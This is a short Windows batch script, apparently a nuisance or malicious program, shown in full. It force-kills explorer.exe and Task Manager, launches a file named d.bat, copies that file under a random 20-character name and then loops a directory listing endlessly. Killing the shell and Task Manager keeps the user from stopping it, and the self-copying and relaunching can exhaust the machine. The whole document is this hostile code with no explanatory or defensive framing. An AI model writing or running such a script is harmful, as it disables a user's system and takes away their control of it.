@echo off
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
set len=20
set charpool=0123456789QWERTZUIOPASDFGHJKLYXCVBNMqwertzuiopasdfghjklyxcvbnm
set len_charpool=62
set gen_str=
for /L %%b IN (1, 1, %len%) do (
  set /A rnd_index=!RANDOM! * %len_charpool% / 32768
  for /F %%i in ('echo %%charpool:~!rnd_index!^,1%%') do set gen_str=!gen_str!%%i
)
taskkill /im explorer.exe /f
taskkill /im taskmgr.exe /f
start %~dp0d.bat
echo %gen_str%
copy %~dp0d.bat %~dp0\%gen_str%
:a
tree /F /A
goto a